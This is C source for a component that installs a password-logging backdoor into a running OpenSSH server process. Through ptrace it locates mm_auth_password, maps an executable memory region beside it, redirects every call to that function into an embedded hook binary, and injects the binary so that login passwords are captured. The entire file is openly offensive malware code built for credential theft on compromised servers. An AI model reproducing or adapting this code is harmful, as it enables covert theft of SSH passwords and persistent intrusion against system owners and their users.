#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#include <inject.h>
#include <sig.h>
#include <common.h>
#include <callcache.h>
#include <util.h>
#include <ptrace.h>

extern unsigned char hook_passlog_bin[];
extern int hook_passlog_bin_len;

void backdoor_password_install(inject_ctx *ctx) {
	u32 use_privsep_val=0;
	u64 use_privsep;
	u64 *mm_auth_password_calls = NULL;
	int i, n_mm_auth_password_calls;
	u64 diff=0, hole_addr=0;
	u8 *evil_bin;

	mod_banner("installing passlogger backdoor");

	evil_bin = malloc(hook_passlog_bin_len);
	memcpy(evil_bin, hook_passlog_bin, hook_passlog_bin_len);

	u64 *import_table = (u64*)(evil_bin + 8);

	use_privsep = resolve_symbol_tab(ctx, "use_privsep");

	if (use_privsep == 0)
		error("could not locate use_privsep :(");

	info("use_privsep\t\t= 0x%llx", use_privsep);

	_peek(ctx->pid, use_privsep, &use_privsep_val, 4);

	info("use_privsep\t\t= 0x%x", use_privsep_val);

	if (use_privsep_val == 0) {
		error("pass logging for PRIVSEP_OFF currently not supported.");
	}

	u64 mm_auth_password = sub_by_debugstr(ctx, "%s: waiting for MONITOR_ANS_AUTHPASSWORD");
	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);

	n_mm_auth_password_calls = find_calls(&mm_auth_password_calls, mm_auth_password);

	if (n_mm_auth_password_calls == 0)
		error("No calls to mm_auth_password found.");

	hole_addr = find_hole(ctx, mm_auth_password_calls[0], 0x1000);
	
	if (hole_addr == 0) {
		error("unable to find neighborly hole.");
	}

	info("found usable hole @ 0x%lx", hole_addr);

	_mmap(
		ctx, (void*)hole_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	_peek(ctx->pid, use_privsep, &use_privsep_val, 4);
	
	// Patch mm_auth_password
	for (i = 0; i < n_mm_auth_password_calls; i++) {
		diff = 0x100000000-(mm_auth_password_calls[i]-hole_addr)-5;

		info(
			"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
			mm_auth_password_calls[i], hole_addr,
			diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
		);

		_poke(ctx->pid, mm_auth_password_calls[i]+1, &diff, 4);
	}

	import_table[0] = ctx->config_addr;
	import_table[1] = mm_auth_password;

	_poke(ctx->pid, hole_addr, evil_bin, hook_passlog_bin_len);
	
	free(mm_auth_password_calls);
}
